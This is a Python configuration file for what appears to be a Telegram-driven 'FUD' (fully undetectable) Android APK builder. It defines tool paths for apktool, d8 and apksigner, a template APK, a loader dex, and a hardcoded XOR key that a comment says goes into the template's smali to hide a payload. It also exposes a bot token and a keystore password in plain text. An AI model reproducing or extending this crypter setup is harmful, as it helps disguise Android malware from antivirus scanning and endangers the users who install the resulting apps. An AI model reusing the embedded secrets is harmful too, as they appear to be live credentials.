import os

BOT_TOKEN = "8902950524:AAFxUFbICKx4sm5JM-WGudYOSfjR3w59_Dk"

_HOME = os.path.expanduser("~")
_HERE = os.path.dirname(os.path.abspath(__file__))
TOOLS_DIR = os.path.join(_HOME, "tools")

JAVA_BIN      = os.path.join(TOOLS_DIR, "jre", "bin", "java")
ECJ_JAR       = os.path.join(TOOLS_DIR, "ecj.jar")
APKTOOL_JAR   = os.path.join(TOOLS_DIR, "apktool.jar")
BT_DIR        = os.path.join(TOOLS_DIR, "build-tools")
APKSIGNER_BIN = os.path.join(BT_DIR, "apksigner")
ZIPALIGN_BIN  = os.path.join(BT_DIR, "zipalign")
D8_BIN        = os.path.join(BT_DIR, "d8")
ANDROID_JAR   = os.path.join(TOOLS_DIR, "platforms", "android-34", "android.jar")

# NAYA naam → naya 4096-bit keystore banega
KEYSTORE_PATH = os.path.join(TOOLS_DIR, "release_play_v3.p12")
KEYSTORE_PASS = "fudbot123"
KEY_ALIAS     = "androidkey"

WORK_DIR = os.path.join(_HOME, "fud_workspace")

TEMPLATE_APK = os.path.join(_HERE, "template.apk")

LOADER_SRC_DIR = os.path.join(TOOLS_DIR, "loader_src")
LOADER_DEX     = os.path.join(TOOLS_DIR, "loader.dex")

# XOR key jo template ke smali me hardcode karna hai (16 bytes)
PAYLOAD_XOR_KEY = bytes([
    0xF1, 0x79, 0x78, 0x72, 0xAC, 0x69, 0x3E, 0xAA,
    0xB1, 0xA6, 0x4F, 0xB7, 0xF2, 0xC6, 0x30, 0x02,
])

URL_JRE        = "https://github.com/adoptium/temurin17-binaries/releases/download/jdk-17.0.11%2B9/OpenJDK17U-jre_x64_linux_hotspot_17.0.11_9.tar.gz"
URL_ECJ        = "https://repo1.maven.org/maven2/org/eclipse/jdt/ecj/3.33.0/ecj-3.33.0.jar"
URL_APKTOOL    = "https://github.com/iBotPeaches/Apktool/releases/download/v2.9.3/apktool_2.9.3.jar"
URL_BUILDTOOLS = "https://dl.google.com/android/repository/build-tools_r34-linux.zip"
